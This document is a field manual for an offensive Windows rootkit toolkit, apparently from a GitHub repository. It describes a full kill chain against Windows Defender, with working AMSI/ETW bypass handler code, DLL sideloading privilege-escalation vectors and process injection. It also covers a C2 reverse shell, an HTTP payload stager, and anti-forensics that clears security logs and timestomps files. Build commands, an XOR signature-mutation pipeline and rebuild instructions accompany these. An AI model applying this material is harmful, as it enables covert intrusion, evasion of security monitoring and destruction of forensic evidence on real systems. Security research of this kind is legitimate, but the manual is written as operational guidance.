# VADER ROOTKIT — FIELD MANUAL

## 22DIV / george wu
## Classification: UNCLASSIFIED // ACADEMIC USE ONLY

---

## Chapter 1: Orientation

Modular offensive security research platform — 7 phases, each a discrete attack technique. Independently testable. Collectively composable into a full kill chain against live Windows Defender.

```
PHASE 0: SHELL        (ALPHA)    C2 reverse shell               shell/
PHASE 1: AMSI BYPASS  (DELTA)    Blind script scanning           amsi/
PHASE 2: ETW PATCH    (FOXTROT)  Blind process telemetry         etw/
PHASE 1+2: DARK ROOM  (CHARLIE)  Combined AMSI+ETW bypass        dark_room/
PHASE 3: PRIVESC      (V4-V7)    User → SYSTEM via DLL sideload  vectors/
PHASE 4: INJECTION    (HOTEL)    Process hiding via DLL inject    injection/
PHASE 5: STAGER       (INDIA)    HTTP payload delivery            stagers/
PHASE 6: FORENSICS    (JULIET)   Anti-forensics cleanup           forensics/
META:     MUTATION     (mutate.py) XOR key rotation pipeline
```

### How They Compose

Phases 1+2 create the "dark room" — a process state where AMSI and ETW are both blind. Phase 3 uses the dark room to escalate privileges via DLL sideloading CVEs. Phase 4 propagates the dark room into other processes via DLL injection. Phase 5 delivers payloads from C2 into the target without touching disk signatures. Phase 6 erases forensic evidence after operations.

The mutation pipeline (mutate.py) rotates all XOR keys, recompiles, and rescans — defeating static signature detection permanently.

---

## Chapter 2: The Kill Chain

```
  PHASE 0        PHASE 1        PHASE 2        PHASE 3
  C2 SHELL  -->  AMSI BLIND --> ETW BLIND  --> PRIVESC
  (ALPHA)        (DELTA)        (FOXTROT)      (V4-V7)
  XOR reverse    DR0 HWBP on    DR1 HWBP on    CWE-732
  shell          AmsiScan       EtwEvent       svc binary
  callback       Buffer         Write          replace
     |              |              |              |
     v              v              v              v
  PHASE 4        PHASE 5        PHASE 6        META
  INJECTION  --> STAGER    -->  FORENSICS  --> MUTATION
  (HOTEL)        (INDIA)        (JULIET)       (mutate.py)
  DLL inject     WinHTTP        canary wipe    XOR key
  + HWBP on      download       log clear      rotation +
  all threads    cradle         timestomp      recompile +
                                self-delete    rescan loop
```

### Standard Kill Chain (Step by Step)

1. **RECON** — `deploy.py --recon` identifies viable sideload vectors on target
2. **C2 SETUP** — `vader_listener.py` on attacker, `vader_shell.exe` compiled with target IP
3. **DARK ROOM** — `dark_room.exe` blinds AMSI + ETW via hardware breakpoints (DR0, DR1)
4. **INJECTION** — `vader_inject.exe --spawn` creates pre-blinded PowerShell, or `vader_inject.exe <PID>` targets running process
5. **STAGER** — `vader_stager.exe` pulls payloads from C2 via HTTP (optional — direct copy works too)
6. **PRIVESC** — Execute chosen sideload vector (V4-V7) for user→SYSTEM
7. **FORENSICS** — `vader_clean.exe --self` erases canaries, logs, prefetch, self-deletes

---

## Chapter 3: The Core Technique — Hardware Breakpoint Bypass

MSRC Finding #36, VULN-195458. Rejected by Microsoft — "detection bypasses are not a security boundary." The foundation everything else is built on.

**The Insight:** CPU debug registers (DR0-DR3) are per-thread, settable from user mode via SetThreadContext. Place a hardware breakpoint on AmsiScanBuffer's entry point and the CPU raises EXCEPTION_SINGLE_STEP before AMSI executes a single instruction.

**The Mechanism:**
1. Resolve AmsiScanBuffer address via GetProcAddress
2. Set DR0 = that address via SetThreadContext (DR7 enables local breakpoint 0)
3. Register VEH handler via AddVectoredExceptionHandler
4. When breakpoint fires: VEH catches EXCEPTION_SINGLE_STEP at target RIP
5. Set RAX = E_INVALIDARG (0x80070057) — caller thinks scan failed
6. Pop return address from RSP into RIP — skip function entirely
7. AmsiScanBuffer never executes. Not one instruction.

**Why Defender Can't See It:**
- Zero bytes modified in memory — no patching, no hooking, no IAT modification
- Debug registers are CPU hardware state, not addressable memory
- SetThreadContext is a legitimate debugging API — no suspicious call
- Per-thread isolation — doesn't affect system-wide Defender behavior
- No kernel interaction beyond normal thread context manipulation

**ETW works identically:** DR1 → EtwEventWrite entry → RAX = STATUS_SUCCESS (0x00000000) → caller thinks telemetry was sent. Defender gets no events.

**VEH Handler Pattern (pseudocode):**
```c
LONG handler(EXCEPTION_POINTERS *ep) {
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;
    CONTEXT *ctx = ep->ContextRecord;
    if (ctx->Rip == amsi_addr) {
        ctx->Rax = 0x80070057;       // E_INVALIDARG
        ctx->Rip = *(DWORD64*)ctx->Rsp;  // pop return address
        ctx->Rsp += 8;               // adjust stack
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    // same pattern for ETW, ntdll targets...
    return EXCEPTION_CONTINUE_SEARCH;
}
```

---

## Chapter 4: XOR Signature Isolation

Each component has its own XOR key. If Defender catches one binary's signature, the others are unaffected — different key, different byte pattern, zero overlap.

### Current Key Map

| Component | Callsign | XOR Key | Arrays | Key Define |
|-----------|----------|---------|--------|------------|
| dark_room | CHARLIE | 0x41 | 5 | XOR_KEY |
| shell | ALPHA | 0x41 | 2 | XOR_KEY |
| inject_dll | HOTEL | 0x77 | 5 | XOR_KEY |
| inject_exe | HOTEL | 0x77 | 3 | XOR_KEY |
| v4_svc_replace | DELTA | 0x52 | 2 | V4_KEY |
| v5_dll_proxy | ECHO | 0x37 | 8 | V5_KEY |
| v6_path_hijack | FOXTROT | 0x63 | 1 | V6_KEY |
| v7_phantom_dll | GOLF | 0x19 | 1 | V7_KEY |
| stager | INDIA | 0x88 | 7 | hardcoded |
| forensics | JULIET | 0x93 | 12 | hardcoded |

### XOR Encoding Helper

```python
key = 0x41  # replace with component's key
s = "your_string"
encoded = ', '.join(f'0x{b^key:02X}' for b in s.encode())
print(f"static unsigned char xName[] = {{{encoded}}};")
print(f"#define xName_LEN {len(s)}")
```

### Decoding (verify an existing array)

```python
key = 0x77
arr = [0x04, 0x16, 0x10, 0x1A, 0x55, 0x13, 0x15, 0x15]  # paste hex values
print(''.join(chr(b ^ key) for b in arr))
```

### Auto-Mutation (mutate.py)

```cmd
python mutate.py               :: rotate ALL keys, recompile, rescan
python mutate.py --target dark_room  :: single component
python mutate.py --dry-run     :: preview without changing
python mutate.py --status      :: show current keys + build status
```

Pipeline:
1. Read source → find `#define XOR_KEY 0xNN`
2. Generate new random key (avoids current + SKYWALKER keys)
3. Decode all XOR arrays with old key, re-encode with new key
4. Write updated source
5. Compile with MSVC
6. Scan against Defender via MpCmdRun.exe
7. Report pass/fail per component

---

## Chapter 5: Compile Reference

### Environment Setup

```cmd
:: VS 2022 Build Tools — adjust path for your installation
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat"

:: Or VS 2022 Community
call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

:: Verify
cl.exe
```

### All Components

```cmd
:: Phase 0 — Reverse Shell (ALPHA)
cl.exe shell\vader_shell_annotated.c /Fe:shell\vader_shell.exe /O1 /GS- /utf-8 /link ws2_32.lib

:: Phase 1 — AMSI Bypass (standalone)
cl.exe amsi\amsi_bypass_hwbp_annotated.c /Fe:amsi\amsi_bypass.exe /O1 /GS- /utf-8

:: Phase 2 — ETW Bypass (standalone)
cl.exe etw\etw_hwbp_annotated.c /Fe:etw\etw_patch.exe /O1 /GS- /utf-8

:: Phase 1+2 — Dark Room (combined AMSI+ETW)
cl.exe dark_room\dark_room_annotated.c /Fe:dark_room\dark_room.exe /O1 /GS- /utf-8

:: Phase 3 — V4: Service Binary Replace
cl.exe vectors\v4_svc_replace\svc_replace_annotated.c /Fe:vectors\v4_svc_replace\WsNativePushService.exe /O1 /GS- /utf-8 /link advapi32.lib user32.lib

:: Phase 3 — V5: DLL Proxy Sideload
cl.exe vectors\v5_dll_proxy\version_proxy_annotated.c /Fe:vectors\v5_dll_proxy\VERSION.dll /LD /O1 /GS- /utf-8 /link advapi32.lib user32.lib

:: Phase 3 — V6: PATH DLL Hijack
cl.exe vectors\v6_path_hijack\path_hijack_dll_annotated.c /Fe:vectors\v6_path_hijack\targetname.dll /LD /O1 /utf-8 /link advapi32.lib user32.lib

:: Phase 3 — V7: Phantom DLL
cl.exe vectors\v7_phantom_dll\phantom_dll_annotated.c /Fe:vectors\v7_phantom_dll\osppc.dll /LD /O1 /GS- /utf-8 /link advapi32.lib user32.lib

:: Phase 4 — Injection DLL
cl.exe injection\vader_inject_dll_annotated.c /Fe:injection\vader_inject.dll /LD /O1 /GS- /utf-8

:: Phase 4 — Injection Loader
cl.exe injection\vader_inject_annotated.c /Fe:injection\vader_inject.exe /O1 /GS- /utf-8

:: Phase 5 — HTTP Stager
cl.exe stagers\http_stager_annotated.c /Fe:stagers\vader_stager.exe /O1 /GS- /utf-8 /link winhttp.lib advapi32.lib

:: Phase 6 — Anti-Forensics
cl.exe forensics\vader_clean_annotated.c /Fe:forensics\vader_clean.exe /O1 /GS- /utf-8 /link advapi32.lib
```

### Common Flags

| Flag | Purpose |
|------|---------|
| `/O1` | Optimize for size — smaller binary, fewer patterns for signatures |
| `/GS-` | Disable buffer security check — removes `__security_check_cookie` import |
| `/utf-8` | UTF-8 source/execution charset |
| `/LD` | Build as DLL instead of EXE |
| `/Fe:path` | Output binary path |
| `/link lib.lib` | Link additional libraries |

---

## Chapter 6: Phase-by-Phase Architecture

### Phase 0: C2 Shell (ALPHA)

| | |
|---|---|
| **Source** | `shell/vader_shell_annotated.c` |
| **Binary** | `vader_shell.exe` |
| **XOR Key** | 0x41 |
| **Listener** | `python shell/vader_listener.py --port 4444` |

XOR-obfuscated reverse shell. Connects back to C2 listener, spawns cmd.exe, pipes stdin/stdout over socket. Built as GUI subsystem — no console window on target.

### Phase 1+2: Dark Room (CHARLIE)

| | |
|---|---|
| **Source** | `dark_room/dark_room_annotated.c` |
| **Binary** | `dark_room.exe` |
| **XOR Key** | 0x41 |

Combined AMSI + ETW hardware breakpoint bypass. Resolves AmsiScanBuffer and EtwEventWrite via XOR-decoded DLL/function names, sets DR0 and DR1, installs VEH handler. After execution: PowerShell runs unmonitored.

### Phase 3: Privilege Escalation (V4-V7)

Four independent DLL sideload vectors targeting Windows services:

| Vector | Codename | Target | Technique | Binary | XOR Key |
|--------|----------|--------|-----------|--------|---------|
| V4 | DELTA | Wondershare NativePush | Service binary replacement | WsNativePushService.exe | 0x52 |
| V5 | ECHO | Various (VERSION.dll) | DLL proxy sideloading | VERSION.dll | 0x37 |
| V6 | FOXTROT | PATH-based DLL load | DLL search order hijack | targetname.dll | 0x63 |
| V7 | GOLF | ClickToRunSvc (osppc.dll) | Phantom DLL loading | osppc.dll | 0x19 |

Each drops its own uniquely-named canary file to prove code execution as SYSTEM.

### Phase 4: Injection (HOTEL)

| | |
|---|---|
| **Source** | `injection/vader_inject_annotated.c` (loader) + `injection/vader_inject_dll_annotated.c` (DLL payload) |
| **Binaries** | `vader_inject.exe` + `vader_inject.dll` |
| **XOR Key** | 0x77 |

DLL injection via VirtualAllocEx + WriteProcessMemory + CreateRemoteThread(LoadLibraryA).

**Two modes:**
- **PID injection** — `vader_inject.exe <PID>` injects into running process
- **CREATE_SUSPENDED** — `vader_inject.exe --spawn` creates new PowerShell suspended, injects DLL, resumes. Process is blind before it executes its first instruction.

**DLL payload internals:**
- XOR-decodes amsi.dll, AmsiScanBuffer, ntdll.dll, EtwEventWrite
- Resolves addresses via GetProcAddress
- Sets DR0-DR3 via SetThreadContext for ALL threads in target
- Installs per-thread VEH handler
- **VdrWatch** — watchdog thread that re-blinds new threads every 2 seconds
- Writes canary at `inject_status.log`

### Phase 5: Stager (INDIA)

| | |
|---|---|
| **Source** | `stagers/http_stager_annotated.c` |
| **Binary** | `vader_stager.exe` |
| **XOR Key** | 0x88 |
| **C2 Server** | `python stagers/vader_serve.py [port]` |

Minimal HTTP dropper via WinHTTP. Downloads payloads from C2 server, writes to disk, optionally executes.

**Download chain:**
1. `dark_room.exe` — primary AMSI+ETW bypass
2. `vader_inject.dll` — injection DLL (optional, with `--inject`)
3. `vader_inject.exe` — injection loader (optional, with `--inject`)

**Modes:**
- `vader_stager.exe` — download + execute (default: 127.0.0.1:8080)
- `vader_stager.exe --test` — download + verify only
- `vader_stager.exe --inject` — also download injection tools

### Phase 6: Anti-Forensics (JULIET)

| | |
|---|---|
| **Source** | `forensics/vader_clean_annotated.c` |
| **Binary** | `vader_clean.exe` |
| **XOR Key** | 0x93 |

Post-operation cleanup. All target paths, log channel names, and API strings XOR-encoded.

**Capabilities:**
- Deletes ALL canary files (V4 svc_health, V5 ver_cache, V6 hwmon_diag, V7 osp_telemetry, inject_status, stager_canary, clean's own log)
- Clears PowerShell Operational event log
- Clears Security event log
- Wipes prefetch files matching VADER binary names
- Timestomps any file to match system32 creation time
- Self-deletion via MoveFileEx(MOVEFILE_DELAY_UNTIL_REBOOT)

**Modes:**
- `vader_clean.exe` — clean all canaries + logs + prefetch
- `vader_clean.exe --timestomp FILE` — timestomp specific file
- `vader_clean.exe --self` — also schedule self-delete on reboot
- `vader_clean.exe --dry-run` — preview without cleaning

**MITRE ATT&CK:** T1070, T1070.001, T1070.004, T1070.006

---

## Chapter 7: Automation (deploy.py)

```cmd
python deploy.py --recon            :: reconnaissance — identify viable vectors
python deploy.py --compile          :: compile all components
python deploy.py --compile-shell IP PORT  :: compile shell with baked-in C2
python deploy.py --deploy V7        :: deploy single vector
python deploy.py --chain V7         :: full kill chain via single vector
python deploy.py --status           :: scan all binaries against Defender
python deploy.py --listen           :: start C2 listener
python deploy.py --canary V7        :: verify canary after exploitation
python deploy.py --pentest          :: full automated pentest run
python deploy.py --pentest --profile radon  :: target-specific profile
python deploy.py --pentest --dry-run  :: preview without execution
```

---

## Chapter 8: Testing Protocol

1. **Annotated version first** — write with full comments, test functionality
2. **Verify against Defender** — scan with RTP enabled: `python tests/scan_all.py`
3. **Document finding** — add to FINDINGS.md with engagement number
4. **Mutation test** — `python mutate.py` → rotate keys → rescan → verify 0 detections
5. **Runtime test** — execute against live Defender, document behavioral detection (or lack thereof)

Never modify the annotated version after it works. Create new mutations as separate files. The annotated original is the reference implementation.

---

## Chapter 9: Reporting Standard

### Finding Format

```
### Key Finding: #NN — Title

[Context and hypothesis]

**Result:** [What happened]

**Evidence:**
[ProcMon output / Defender logs / test output]

**Significance:** [What this means for the attack surface]

**MSRC Relevance:** [CVE potential assessment]
```

### Engagement Format

```
## Engagement N — Title (DATE)

### Hypothesis
### Procedure
### Result
### Findings (reference #NN)
```

---

## Chapter 10: Skywalker Lineage

SKYWALKER is VADER's cold-standby fork. Same techniques, completely independent signatures.

**Why it exists:** If VADER's signatures are ever burned (Defender detects a pattern), SKYWALKER remains clean. Different XOR keys, different binary names, different directory structure. Zero cryptographic overlap.

**Key differences:**

| Aspect | VADER | SKYWALKER |
|--------|-------|-----------|
| Binary prefix | `vader_*` / vector-specific | `sw_*` |
| Dark room | `dark_room/` | `eclipse/` |
| Shell | `shell/` | `beacon/` |
| Injection | `injection/` | `thread/` |
| Stager | `stagers/` | `fetch/` |
| Forensics | `forensics/` | `sweep/` |
| XOR keys | 0x41, 0x77, 0x52, etc. | 0xBD, 0x5A, 0x2E, etc. |

SKYWALKER's mutation pipeline blocklists all VADER keys. VADER's blocklists all SKYWALKER keys. A key collision between the two repos is impossible by design.

**SKYWALKER repo:** `rainfantry/skywalker` (private)
**SKYWALKER manual:** `SKYWALKER_FIELD_MANUAL.md` in that repo

---

## Chapter 11: Rebuild From Nothing

### If you have the repo

```cmd
git clone https://github.com/rainfantry/vader-rootkit.git
cd vader-rootkit
```

Install Visual Studio 2022 (Build Tools or Community) with "Desktop development with C++" workload.

```cmd
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
python deploy.py --compile     :: compile everything
python mutate.py               :: rotate to fresh keys
python tests/scan_all.py       :: verify 0 detections
python deploy.py --recon       :: identify viable vectors on this machine
```

### If the repo is gone

SKYWALKER has the same techniques with different names. Clone it, rename, re-key.

If BOTH repos are gone: the technique is in Chapter 3 of this manual. The core is ~40 lines of C:
1. GetProcAddress to resolve target function
2. GetThreadContext / SetThreadContext to set DR0 + DR7
3. AddVectoredExceptionHandler to catch EXCEPTION_SINGLE_STEP
4. VEH handler: check RIP, set RAX to return value, pop return address

Build from that foundation. XOR encoding helper:

```python
key = 0xNN  # any byte except 0x00, avoid existing repo keys
s = "AmsiScanBuffer"
encoded = ', '.join(f'0x{b^key:02X}' for b in s.encode())
print(f"static unsigned char xName[] = {{{encoded}}};")
print(f"#define xName_LEN {len(s)}")
```

---

## Chapter 12: Document Map

| Document | Purpose |
|----------|---------|
| `README.md` | Overview, kill chain diagram, classification |
| `docs/FIELD_MANUAL.md` | **This file** — complete reference, rebuild guide |
| `OPERATIONS_MANUAL.md` | Vector-by-vector reference (V1-V7 + Phases 4-6) |
| `EXECUTION_MANUAL.md` | Step-by-step kill chain walkthrough |
| `LEARNING_MANUAL.md` | Educational deep-dive — teaches concepts, not commands |
| `SCANNER_MANUAL.md` | vader_recon.ps1 user manual |
| `ENGAGEMENT_LOG.md` | Chronological test log |
| `FINDINGS.md` | Numbered findings index |
| `PHASE4_INVESTIGATION.md` | Phase 4 investigative report |
| `deploy.py` | Automated kill chain orchestrator |
| `mutate.py` | XOR key mutation pipeline |
| `tests/scan_all.py` | Detection status scanner |
| Component `BUILD.md` files | Per-component compile recipes |
| Component `README.md` files | Per-component architecture docs |
